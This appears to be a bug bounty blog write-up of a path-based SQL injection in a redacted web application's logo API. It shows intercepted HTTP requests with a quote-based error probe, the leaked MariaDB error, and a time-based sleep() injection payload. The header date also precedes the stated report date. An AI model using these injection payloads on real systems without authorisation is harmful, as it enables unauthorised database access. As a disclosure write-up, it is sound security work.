---
title: "The exploitation of a $$$$ SQL Injection Path Based"
date: 2024-06-03 08:13:13 -03
categories: [bugbounty]
tags: [bugbounty]
image: /assets/img/Posts/sqli.png
---

# Here is how I exploited a unusual SQL Injection Path Based and got rewarded with bounty 


First of all, here are some sections that will be covered in this article,

```
┌───────────────Summary────────────────┐
│                                      │
│  1. Fase One - Analysing features    │
│     - Finding interesting feature    │
│  2. Fase Two - Exploitation          │
│                                      │
└──────────────────────────────────────┘
```

# Section 1 - Analysing features

In this web application, after logging in, This site had 3 main functionalities, one for creating `ebrochures`, another for creating `embed content`, and another for creating `mini sites`.

All of this 3 functionalities had a logo system, which query all existent logos uploaded to the website, along with a `logo upload` which will be covered in the next article 💀.

<img src="/assets/img/Posts/functionalities.png">


## Finding Interesting Feature

After identifying that there was a `logo upload system`, and that it searched for existing logos using a `query`, I decided to take a deeper look at this part.

<img src="/assets/img/Posts/logofunc.png">

To show the logos that have been approved, it makes a `suspicious query`, and then `loads the page` and makes it possible to upload another logo. 

In this article I will only focus on the exploration part of how the application gets these `approved logos`.


# Section 2 - Exploitation

Now, by intercepting the request to logo endpoint, we have the following:

**Request**:

```
GET /api/csb/agency-logos/session/446423692089-1763610-6897710-9302502/include/Approved,Rejected,Pending/allAgencies/false/sortBy/DATE_DESC HTTP/2
Host: redacted.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/plain, */*
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers


```

Analyzing the request, it was possible to notice that after the include/ endpoint, 

it uses as arguments some values that serve to `identify` the logos, that is, those values that are there are used to `filter` the logos by `approved` logos, `pending approval`, or `rejected`.

Which seems strange, because a `comma` is even being used to separate the arguments, and at the end of the path there is a `sortBy`, which leads me to believe that this endpoint is probably `querying the database` to get the logos

**Request with single quote**:

```
GET /api/csb/agency-logos/session/446423692089-1763610-6897710-9302502/include/Approved'/allAgencies/false/sortBy/DATE_DESC HTTP/2
Host: redacted.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/plain, */*
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers


```

What we got:
```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''Approved'')  ORDER BY CAST(STATUS AS CHAR) ASC, APPROVED_DATE DESC' at line 20, errors: [{errorType: (SYSTEM_ERROR, System Error), errorCode: (030003, System Error), message: Dao Error}]}",
```

Perfect!, we now know for sure it is vulnerable to SQL Injection.

---

Since we know that the query has '), we need to escape it but fix the syntax by also putting the ), so as not to break the query

**Time Based Payload Request**:

```
GET /api/csb/agency-logos/session/446423692089-1763610-6897710-9302502/include/Approved')+and+sleep(2)+--+-/allAgencies/false/sortBy/DATE_DESC HTTP/2
Host: www.redacted.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/plain, */*
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers


```


Due to the use of `akamai cdn`, and communication with `internal servers`, sleep payload was taking `6 seconds longer`, that is, `sleep(1)` takes 6 seconds, `sleep(2)` 12 seconds, and `sleep(3)`, 18 seconds, but this did not affect the triage of the report.

**sleep(1)**:

<img src="/assets/img/Posts/1sec.png">

**sleep(2)**:

<img src="/assets/img/Posts/2sec.png">


This was enough to get the report triaged. GG!

---



# Thank you !


<img src="/assets/img/Posts/end.png">

# Report Status


> Reported at - July 9, 2024, 10:26pm UTC

> Triaged at - July 10, 2024, 8:35pm UTC

> Payed at - July 11, 2024, 7:03pm UTC

> OBS: This report was made along with my friend which found this application and program for testing and send it to me, thanks @foorw1nner :)

<img src="/assets/img/Posts/bountysqli.png">
